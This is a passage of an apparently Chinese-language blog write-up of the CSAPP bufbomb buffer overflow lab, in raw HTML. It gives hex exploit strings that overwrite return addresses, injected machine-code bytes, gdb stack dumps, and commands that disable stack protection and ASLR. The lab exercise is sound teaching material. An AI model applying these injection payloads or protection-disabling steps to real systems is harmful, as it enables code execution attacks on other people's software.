class=\"number\">0</span>0 <span class=\"number\">0</span>0 \tmovl   $<span class=\"number\">0</span>x0,(%esp)</span><br><span class=\"line\"> <span class=\"number\">8048</span>df5:\te8 aa f9 ff ff       \tcall   <span class=\"number\">80487</span>a4 &lt;exit<span class=\"keyword\">@plt</span>&gt;</span><br><span class=\"line\"> <span class=\"number\">8048</span>dfa:\t<span class=\"number\">8</span>d b6 <span class=\"number\">0</span>0 <span class=\"number\">0</span>0 <span class=\"number\">0</span>0 <span class=\"number\">0</span>0    \tlea    <span class=\"number\">0</span>x0(%esi),%esi</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"number\">8048e0</span>0:\t<span class=\"number\">89</span> <span class=\"number\">5</span>c <span class=\"number\">24</span> <span class=\"number\">0</span>4          \tmov    %ebx,<span class=\"number\">0</span>x4(%esp)</span><br><span class=\"line\"> <span class=\"number\">8048e0</span>4:\tc7 <span class=\"number\">0</span>4 <span class=\"number\">24</span> <span class=\"number\">29</span> <span class=\"number\">9</span>a <span class=\"number\">0</span>4 <span class=\"number\">0</span>8 \tmovl   $<span class=\"number\">0</span>x8049a29,(%esp) # 传入字符串<span class=\"string\">&quot; Fizz!: You called fizz(0x%x)\\n&quot;</span></span><br><span class=\"line\">;  (gdb) p (<span class=\"built_in\">char</span>*) <span class=\"number\">0</span>x8049a29</span><br><span class=\"line\">; $<span class=\"number\">54</span> = <span class=\"number\">0</span>x8049a29 <span class=\"string\">&quot;Fizz!: You called fizz(0x%x)\\n&quot;</span> &lt;- 这个才是成功的</span><br><span class=\"line\"> <span class=\"number\">8048e0</span>b:\te8 <span class=\"number\">54</span> f9 ff ff       \tcall   <span class=\"number\">8048764</span> &lt;printf<span class=\"keyword\">@plt</span>&gt;</span><br><span class=\"line\"> <span class=\"number\">8048e10</span>:\tc7 <span class=\"number\">0</span>4 <span class=\"number\">24</span> <span class=\"number\">0</span>1 <span class=\"number\">0</span>0 <span class=\"number\">0</span>0 <span class=\"number\">0</span>0 \tmovl   $<span class=\"number\">0</span>x1,(%esp)</span><br><span class=\"line\"> <span class=\"number\">8048e17</span>:\te8 c4 fc ff ff       \tcall   <span class=\"number\">8048</span>ae0 &lt;validate&gt;</span><br><span class=\"line\"> <span class=\"number\">8048e1</span>c:\teb d0                \tjmp    <span class=\"number\">8048</span>dee &lt;fizz+<span class=\"number\">0</span>x2e&gt;</span><br><span class=\"line\"> <span class=\"number\">8048e1</span>e:\t<span class=\"number\">89</span> f6                \tmov    %esi,%esi</span><br></pre></td></tr></table></figure>\n<p>我们知道，要想成功，必须在跳转到 <code>fizz</code> 函数后，传入参数（参数值为自己的 cookie）。这个参数保存在 <code>0x8(%ebp)</code> 中。老方法，直接覆盖即可：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">41 42 43 44 45 46 47 48 49 4a 4b 4c ff ff ff ff c0 8d 04 08 ee ee ee ee 15 85 c9 2a</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight d\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(gdb) p /x $esp</span><br><span class=\"line\">$<span class=\"number\">1</span> = <span class=\"number\">0</span>xffffba44</span><br><span class=\"line\"></span><br><span class=\"line\">(gdb) p /x $ebp</span><br><span class=\"line\">$<span class=\"number\">2</span> = <span class=\"number\">0</span>xffffba5c</span><br><span class=\"line\"></span><br><span class=\"line\">(gdb) x/<span class=\"number\">60</span>xb $esp</span><br><span class=\"line\"><span class=\"number\">0</span>xffffba44:⏩  <span class=\"number\">0</span>x74    <span class=\"number\">0</span>x2b    <span class=\"number\">0</span>xdf    <span class=\"number\">0</span>xf7    <span class=\"number\">0</span>x0b    <span class=\"number\">0</span>x38    <span class=\"number\">0</span>xe3    <span class=\"number\">0</span>xf7</span><br><span class=\"line\"><span class=\"number\">0</span>xffffba4c:     <span class=\"number\">0</span>x41    <span class=\"number\">0</span>x42    <span class=\"number\">0</span>x43    <span class=\"number\">0</span>x44    <span class=\"number\">0</span>x45    <span class=\"number\">0</span>x46    <span class=\"number\">0</span>x47    <span class=\"number\">0</span>x48</span><br><span class=\"line\"><span class=\"number\">0</span>xffffba54:     <span class=\"number\">0</span>x49    <span class=\"number\">0</span>x4a    <span class=\"number\">0</span>x4b    <span class=\"number\">0</span>x4c    <span class=\"number\">0</span>x00    <span class=\"number\">0</span>x00    <span class=\"number\">0</span>x00    <span class=\"number\">0</span>x00</span><br><span class=\"line\"><span class=\"number\">0</span>xffffba5c:▶   <span class=\"number\">0</span>xff    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>xee    <span class=\"number\">0</span>xee    <span class=\"number\">0</span>xee    <span class=\"number\">0</span>xee</span><br><span class=\"line\"><span class=\"number\">0</span>xffffba64:     ❤<span class=\"number\">0</span>x15    <span class=\"number\">0</span>x85    <span class=\"number\">0</span>xc9    <span class=\"number\">0</span>x2a❤    <span class=\"number\">0</span>x00    <span class=\"number\">0</span>xba    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>xff</span><br><span class=\"line\"><span class=\"number\">0</span>xffffba6c:     <span class=\"number\">0</span>x60    <span class=\"number\">0</span>x90    <span class=\"number\">0</span>xf2    <span class=\"number\">0</span>xf7    <span class=\"number\">0</span>x86    <span class=\"number\">0</span>x91    <span class=\"number\">0</span>xf2    <span class=\"number\">0</span>xf7</span><br><span class=\"line\"><span class=\"number\">0</span>xffffba74:     <span class=\"number\">0</span>xef    <span class=\"number\">0</span>xbe    <span class=\"number\">0</span>xad    <span class=\"number\">0</span>xde    <span class=\"number\">0</span>x98    <span class=\"number\">0</span>xcc    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>xff</span><br><span class=\"line\"><span class=\"number\">0</span>xffffba7c:     <span class=\"number\">0</span>x05    <span class=\"number\">0</span>x91    <span class=\"number\">0</span>x04    <span class=\"number\">0</span>x08</span><br></pre></td></tr></table></figure>\n<p>运行结果如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Type string:Fizz!: You called fizz(0x2ac98515)</span><br></pre></td></tr></table></figure>\n<h2 id=\"level-2-鞭炮选做\"><a class=\"markdownIt-Anchor\" href=\"#level-2-鞭炮选做\"></a> Level 2 - 鞭炮【选做】</h2>\n<blockquote>\n<p>本层考察指令注入。</p>\n</blockquote>\n<p>这一层我们需要跳转到另一个函数：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> global_value = <span class=\"number\">0</span>; </span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">bang</span><span class=\"params\">(<span class=\"type\">int</span> val)</span> </span><br><span class=\"line\">&#123; </span><br><span class=\"line\">\tentry_check(<span class=\"number\">2</span>); <span class=\"comment\">/* Make sure entered this function properly */</span> </span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (global_value == cookie) &#123; </span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Bang!: You set global_value to 0x%x\\n&quot;</span>, global_value); <span class=\"comment\">// 必须执行到这里</span></span><br><span class=\"line\">\t\tvalidate(<span class=\"number\">2</span>); </span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> </span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Misfire: global_value = 0x%x\\n&quot;</span>, global_value); </span><br><span class=\"line\">\t<span class=\"built_in\">exit</span>(<span class=\"number\">0</span>); </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>与上一层的不同点在于这个函数检查的是全局变量，全局变量存储在一个特定的地址中。</p>\n<p>观察反汇编后的代码：</p>\n<figure class=\"highlight d\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0</span>8048d60 &lt;bang&gt;:</span><br><span class=\"line\"> <span class=\"number\">8048</span>d60:\t<span class=\"number\">55</span>                   \tpush   %ebp</span><br><span class=\"line\"> <span class=\"number\">8048</span>d61:\t<span class=\"number\">89</span> e5                \tmov    %esp,%ebp</span><br><span class=\"line\"> <span class=\"number\">8048</span>d63:\t<span class=\"number\">83</span> ec <span class=\"number\">0</span>8             \tsub    $<span class=\"number\">0</span>x8,%esp</span><br><span class=\"line\"> <span class=\"number\">8048</span>d66:\tc7 <span class=\"number\">0</span>4 <span class=\"number\">24</span> <span class=\"number\">0</span>2 <span class=\"number\">0</span>0 <span class=\"number\">0</span>0 <span class=\"number\">0</span>0 \tmovl   $<span class=\"number\">0</span>x2,(%esp)</span><br><span class=\"line\"> <span class=\"number\">8048</span>d6d:\te8 <span class=\"number\">2</span>e fc ff ff       \tcall   <span class=\"number\">80489</span>a0 &lt;entry_check&gt;</span><br><span class=\"line\"> <span class=\"number\">8048</span>d72:\ta1 dc a1 <span class=\"number\">0</span>4 <span class=\"number\">0</span>8       \tmov    <span class=\"number\">0</span>x804a1dc,%eax   # 全局变量存放地址（我们需要修改）</span><br><span class=\"line\">;  (gdb) p /x *<span class=\"number\">0</span>x804a1dc</span><br><span class=\"line\">; $<span class=\"number\">5</span> = <span class=\"number\">0</span>x0</span><br><span class=\"line\"> <span class=\"number\">8048</span>d77:\t<span class=\"number\">3</span>b <span class=\"number\">0</span>5 cc a1 <span class=\"number\">0</span>4 <span class=\"number\">0</span>8    \tcmp    <span class=\"number\">0</span>x804a1cc,%eax   # cookie存放地址</span><br><span class=\"line\">;  (gdb) p /x *<span class=\"number\">0</span>x804a1cc</span><br><span class=\"line\">; $<span class=\"number\">6</span> = <span class=\"number\">0</span>x2ac98515 </span><br><span class=\"line\"> <span class=\"number\">8048</span>d7d:\t<span class=\"number\">74</span> <span class=\"number\">21</span>                \tje     <span class=\"number\">8048</span>da0 &lt;bang+<span class=\"number\">0</span>x40&gt;</span><br><span class=\"line\"> <span class=\"number\">8048</span>d7f:\t<span class=\"number\">89</span> <span class=\"number\">44</span> <span class=\"number\">24</span> <span class=\"number\">0</span>4          \tmov    %eax,<span class=\"number\">0</span>x4(%esp)</span><br><span class=\"line\"> <span class=\"number\">8048</span>d83:\tc7 <span class=\"number\">0</span>4 <span class=\"number\">24</span> <span class=\"number\">0</span>b <span class=\"number\">9</span>a <span class=\"number\">0</span>4 <span class=\"number\">0</span>8 \tmovl   $<span class=\"number\">0</span>x8049a0b,(%esp)</span><br><span class=\"line\"> <span class=\"number\">8048</span>d8a:\te8 d5 f9 ff ff       \tcall   <span class=\"number\">8048764</span> &lt;printf<span class=\"keyword\">@plt</span>&gt;</span><br><span class=\"line\"> <span class=\"number\">8048</span>d8f:\tc7 <span class=\"number\">0</span>4 <span class=\"number\">24</span> <span class=\"number\">0</span>0 <span class=\"number\">0</span>0 <span class=\"number\">0</span>0 <span class=\"number\">0</span>0 \tmovl   $<span class=\"number\">0</span>x0,(%esp)</span><br><span class=\"line\"> <span class=\"number\">8048</span>d96:\te8 <span class=\"number\">0</span>9 fa ff ff       \tcall   <span class=\"number\">80487</span>a4 &lt;exit<span class=\"keyword\">@plt</span>&gt;</span><br><span class=\"line\"> <span class=\"number\">8048</span>d9b:\t<span class=\"number\">90</span>                   \tnop</span><br><span class=\"line\"> <span class=\"number\">8048</span>d9c:\t<span class=\"number\">8</span>d <span class=\"number\">74</span> <span class=\"number\">26</span> <span class=\"number\">0</span>0          \tlea    <span class=\"number\">0</span>x0(%esi,%eiz,<span class=\"number\">1</span>),%esi</span><br><span class=\"line\"> <span class=\"number\">8048</span>da0:\t<span class=\"number\">89</span> <span class=\"number\">44</span> <span class=\"number\">24</span> <span class=\"number\">0</span>4          \tmov    %eax,<span class=\"number\">0</span>x4(%esp)</span><br><span class=\"line\"> <span class=\"number\">8048</span>da4:\tc7 <span class=\"number\">0</span>4 <span class=\"number\">24</span> <span class=\"number\">70</span> <span class=\"number\">98</span> <span class=\"number\">0</span>4 <span class=\"number\">0</span>8 \tmovl   $<span class=\"number\">0</span>x8049870,(%esp)</span><br><span class=\"line\"> <span class=\"number\">8048</span>dab:\te8 b4 f9 ff ff       \tcall   <span class=\"number\">8048764</span> &lt;printf<span class=\"keyword\">@plt</span>&gt;</span><br><span class=\"line\"> <span class=\"number\">8048</span>db0:\tc7 <span class=\"number\">0</span>4 <span class=\"number\">24</span> <span class=\"number\">0</span>2 <span class=\"number\">0</span>0 <span class=\"number\">0</span>0 <span class=\"number\">0</span>0 \tmovl   $<span class=\"number\">0</span>x2,(%esp)</span><br><span class=\"line\"> <span class=\"number\">8048</span>db7:\te8 <span class=\"number\">24</span> fd ff ff       \tcall   <span class=\"number\">8048</span>ae0 &lt;validate&gt;</span><br><span class=\"line\"> <span class=\"number\">8048</span>dbc:\teb d1                \tjmp    <span class=\"number\">8048</span>d8f &lt;bang+<span class=\"number\">0</span>x2f&gt;</span><br><span class=\"line\"> <span class=\"number\">8048</span>dbe:\t<span class=\"number\">89</span> f6                \tmov    %esi,%esi</span><br></pre></td></tr></table></figure>\n<p>程序取全局变量的地址为 <code>0x804a1dc</code>，这个地址初始值为 0。程序计算好的 cookie 放在 <code>0x804a1cc</code>，会和全局变量进行比较。我们的任务是实现修改全局变量，我们这时候就需要构造指令，注入代码了。</p>\n<p>构造指令的步骤：</p>\n<ol>\n<li>写一小段汇编程序 <code>level2.s</code></li>\n<li>编译：<code>gcc -c level2.s </code></li>\n<li>反汇编得到字节码：<code>objdump -d level2.o &gt; level2.d</code></li>\n</ol>\n<p>这段代码如何执行？前面两个实验已经实现了跳转到某个函数地址执行代码，我们可以使其跳转到缓冲区中，执行我们注入的指令。</p>\n<p>但是在默认的情况下，栈中的内容不可执行（课本好像讲过相关内容），我们需要使用工具 <code>execstack</code> 接触栈执行的限制：</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">sudo</span> apt-get install execstack <span class=\"comment\"># 安装 execstack</span></span><br><span class=\"line\">execstack -s bufbomb                  <span class=\"comment\"># 亲测，GDB做到这一步就行</span></span><br><span class=\"line\">sysctl -w kernel.randomize_va_space=0 <span class=\"comment\"># 关闭ASLR（地址空间随机化）命令</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>如果不解除限制，后续实验可能会报段错误。</p>\n</blockquote>\n<p>下面编写 <code>level2.s</code>：</p>\n<figure class=\"highlight d\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">movl $<span class=\"number\">0</span>x2ac98515,<span class=\"number\">0</span>x804a1dc</span><br><span class=\"line\">movl $<span class=\"number\">0</span>x08048d60,(%rsp)</span><br><span class=\"line\">ret</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>注意汇编代码文件末尾有空行，否则有警告：warning: end of file not at end of a line; newline inserted</p>\n</blockquote>\n<p>上面的汇编代码做了几件事情：</p>\n<ol>\n<li>把 cookie 放入全局变量（<code>0x804a1dc</code>）中</li>\n<li>把 bang 的函数地址压栈</li>\n<li>返回。（弹栈跳转到指定地址）</li>\n</ol>\n<p>使用反汇编工具得到的字节码如下：</p>\n<figure class=\"highlight d\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">level2.o:     file format elf64-x86-<span class=\"number\">64</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Disassembly of section .text:</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0</span>000000000000000 &lt;.text&gt;:</span><br><span class=\"line\">   <span class=\"number\">0</span>:\tc7 <span class=\"number\">0</span>4 <span class=\"number\">25</span> dc a1 <span class=\"number\">0</span>4 <span class=\"number\">0</span>8 \tmovl   $<span class=\"number\">0</span>x2ac98515,<span class=\"number\">0</span>x804a1dc</span><br><span class=\"line\">   <span class=\"number\">7</span>:\t<span class=\"number\">15</span> <span class=\"number\">85</span> c9 <span class=\"number\">2</span>a </span><br><span class=\"line\">   b:\tc7 <span class=\"number\">0</span>4 <span class=\"number\">24</span> <span class=\"number\">60</span> <span class=\"number\">8</span>d <span class=\"number\">0</span>4 <span class=\"number\">0</span>8 \tmovl   $<span class=\"number\">0</span>x8048d60,(%rsp)</span><br><span class=\"line\">  <span class=\"number\">12</span>:\tc3                   \tretq   </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>因此我们的指令字节为：<code>c7 04 25 dc a1 04 08 15 85 c9 2a c7 04 24 60 8d 04 08 c3</code></p>\n<p>这里先给出本层答案，然后看下面的说明就能理解：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">41 42 43 44 45 46 47 48 49 4a 4b 4c ff ff ff ff 60 ba ff ff c7 04 25 dc a1 04 08 15 85 c9 2a c7 04 24 60 8d 04 08 c3 </span><br></pre></td></tr></table></figure>\n<p>执行 <code>getbuff</code> 函数结束前，我们需要看一下栈的地址以便确定跳转到哪里：</p>\n<figure class=\"highlight d\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(gdb) p /x $esp</span><br><span class=\"line\">$<span class=\"number\">1</span> = <span class=\"number\">0</span>xffffba40   ⏩</span><br><span class=\"line\"></span><br><span class=\"line\">(gdb) p /x $ebp</span><br><span class=\"line\">$<span class=\"number\">2</span> = <span class=\"number\">0</span>xffffba58   ▶</span><br><span class=\"line\"></span><br><span class=\"line\">(gdb) x/<span class=\"number\">64</span>xb $esp</span><br><span class=\"line\"><span class=\"number\">0</span>xffffba40:⏩  <span class=\"number\">0</span>x4c    <span class=\"number\">0</span>xba    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>x74    <span class=\"number\">0</span>x2b    <span class=\"number\">0</span>xdf    <span class=\"number\">0</span>xf7</span><br><span class=\"line\"><span class=\"number\">0</span>xffffba48:     <span class=\"number\">0</span>x0b    <span class=\"number\">0</span>x38    <span class=\"number\">0</span>xe3    <span class=\"number\">0</span>xf7    😀<span class=\"number\">0</span>x41    <span class=\"number\">0</span>x42    <span class=\"number\">0</span>x43    <span class=\"number\">0</span>x44</span><br><span class=\"line\"><span class=\"number\">0</span>xffffba50:     <span class=\"number\">0</span>x45    <span class=\"number\">0</span>x46    <span class=\"number\">0</span>x47    <span class=\"number\">0</span>x48    <span class=\"number\">0</span>x49    <span class=\"number\">0</span>x4a    <span class=\"number\">0</span>x4b    <span class=\"number\">0</span>x4c😉</span><br><span class=\"line\"><span class=\"number\">0</span>xffffba58:▶  <span class=\"number\">0</span>xff    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>xff    ❤<span class=\"number\">0</span>x60    <span class=\"number\">0</span>xba    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>xff❤</span><br><span class=\"line\"><span class=\"number\">0</span>xffffba60:   ☢<span class=\"number\">0</span>xc7    <span class=\"number\">0</span>x04    <span class=\"number\">0</span>x25    <span class=\"number\">0</span>xdc    <span class=\"number\">0</span>xa1    <span class=\"number\">0</span>x04    <span class=\"number\">0</span>x08    <span class=\"number\">0</span>x15</span><br><span class=\"line\"><span class=\"number\">0</span>xffffba68:     <span class=\"number\">0</span>x85    <span class=\"number\">0</span>xc9    <span class=\"number\">0</span>x2a    <span class=\"number\">0</span>xc7    <span class=\"number\">0</span>x04    <span class=\"number\">0</span>x24    <span class=\"number\">0</span>x60    <span class=\"number\">0</span>x8d</span><br><span class=\"line\"><span class=\"number\">0</span>xffffba70:     <span class=\"number\">0</span>x04    <span class=\"number\">0</span>x08    <span class=\"number\">0</span>xc3☢    <span class=\"number\">0</span>x00    <span class=\"number\">0</span>xef    <span class=\"number\">0</span>xbe    <span class=\"number\">0</span>xad    <span class=\"number\">0</span>xde</span><br><span class=\"line\"><span class=\"number\">0</span>xffffba78:     <span class=\"number\">0</span>x98    <span class=\"number\">0</span>xcc    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>x05    <span class=\"number\">0</span>x91    <span class=\"number\">0</span>x04    <span class=\"number\">0</span>x08</span><br></pre></td></tr></table></figure>\n<p>上面内容是不是很熟悉，在 Level0 中出现过。😀😉标记就是程序分配的 12 个字节缓冲区，❤标记的是跳转到的目标地址。☢标记的是注入的指令。</p>\n<p>因此❤中应填写：<code>0xffffba60</code> 对应的小端编码。</p>\n<p>程序结果为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Type string:Bang!: You set global_value to 0x2ac98515</span><br></pre></td></tr></table></figure>\n<h2 id=\"level-3-炸药选做\"><a class=\"markdownIt-Anchor\" href=\"#level-3-炸药选做\"></a> Level 3 - 炸药【选做】</h2>\n<blockquote>\n<p>本层为综合发散考察。</p>\n</blockquote>\n<p>关于本层的提示，在上面 3 层的答案中，我们用 <code>ff ff ff ff</code> 把 <code>%ebp</code> 的值覆盖掉了。但这一层不太一样，它会检测 <code>%ebp</code> 的值是否改动。</p>\n<p>首先给出了完整的 test 函数：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">test</span><span class=\"params\">()</span> </span><br><span class=\"line\">&#123; </span><br><span class=\"line\">\t<span class=\"type\">int</span> val; </span><br><span class=\"line\">\t<span class=\"keyword\">volatile</span> <span class=\"type\">int</span> local = <span class=\"number\">0xdeadbeef</span>; </span><br><span class=\"line\">\tentry_check(<span class=\"number\">3</span>); <span class=\"comment\">/* Make sure entered this function properly */</span> </span><br><span class=\"line\">\tval = getbuf(); </span><br><span class=\"line\">\t<span class=\"comment\">/* Check for corrupted stack */</span> </span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (local != <span class=\"number\">0xdeadbeef</span>) &#123; </span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Sabotaged!: the stack has been corrupted\\n&quot;</span>); </span><br><span class=\"line\">\t&#125; </span><br><span class=\"line\">\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (val == cookie) &#123; </span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Boom!: getbuf returned 0x%x\\n&quot;</span>, val);   <span class=\"comment\">// 我们需要进入到这里</span></span><br><span class=\"line\">\t\tvalidate(<span class=\"number\">3</span>); </span><br><span class=\"line\">\t&#125; </span><br><span class=\"line\">\t<span class=\"keyword\">else</span> &#123; </span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Dud: getbuf returned 0x%x\\n&quot;</span>, val); </span><br><span class=\"line\">\t&#125; </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>要点：</p>\n<ol>\n<li><code>val</code> 是 <code>getbuf()</code> 的返回值，我们需要修改这个返回值为我们的 cookie</li>\n<li>保证程序在取 <code>local</code> 时能正确取到魔数 <code>0xdeadbeef</code></li>\n</ol>\n<p>观察 test 汇编代码：</p>\n<figure class=\"highlight d\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0</span>8049000 &lt;test&gt;:</span><br><span class=\"line\"> <span class=\"number\">8049000</span>:\t<span class=\"number\">55</span>                   \tpush   %ebp</span><br><span class=\"line\"> <span class=\"number\">8049001</span>:\t<span class=\"number\">89</span> e5                \tmov    %esp,%ebp</span><br><span class=\"line\"> <span class=\"number\">8049003</span>:\t<span class=\"number\">83</span> ec <span class=\"number\">18</span>             \tsub    $<span class=\"number\">0</span>x18,%esp</span><br><span class=\"line\"> <span class=\"number\">8049006</span>:\tc7 <span class=\"number\">45</span> fc ef be ad de \tmovl   $<span class=\"number\">0</span>xdeadbeef,-<span class=\"number\">0</span>x4(%ebp) ; %ebp: <span class=\"number\">0</span>xffffba78</span><br><span class=\"line\"> <span class=\"number\">804900</span>d:\tc7 <span class=\"number\">0</span>4 <span class=\"number\">24</span> <span class=\"number\">0</span>3 <span class=\"number\">0</span>0 <span class=\"number\">0</span>0 <span class=\"number\">0</span>0 \tmovl   $<span class=\"number\">0</span>x3,(%esp)</span><br><span class=\"line\"> <span class=\"number\">8049014</span>:\te8 <span class=\"number\">87</span> f9 ff ff       \tcall   <span class=\"number\">80489</span>a0 &lt;entry_check&gt;</span><br><span class=\"line\"> <span class=\"number\">8049019</span>:\te8 c2 ff ff ff       \tcall   <span class=\"number\">8048</span>fe0 &lt;getbuf&gt;</span><br><span class=\"line\"> <span class=\"number\">804901</span>e:\t<span class=\"number\">89</span> c2                \tmov    %eax,%edx        # %edx 存储 getbuf 返回值</span><br><span class=\"line\"> <span class=\"number\">8049020</span>:\t<span class=\"number\">8</span>b <span class=\"number\">45</span> fc             \tmov    -<span class=\"number\">0</span>x4(%ebp),%eax  # local = -<span class=\"number\">0</span>x4(%ebp)</span><br><span class=\"line\"> <span class=\"number\">8049023</span>:\t<span class=\"number\">3</span>d ef be ad de       \tcmp    $<span class=\"number\">0</span>xdeadbeef,%eax</span><br><span class=\"line\"> <span class=\"number\">8049028</span>:\t<span class=\"number\">74</span> <span class=\"number\">0</span>e                \tje     <span class=\"number\">8049038</span> &lt;test+<span class=\"number\">0</span>x38&gt; # 必须相等</span><br><span class=\"line\"> <span class=\"number\">804902</span>a:\tc7 <span class=\"number\">0</span>4 <span class=\"number\">24</span> b8 <span class=\"number\">98</span> <span class=\"number\">0</span>4 <span 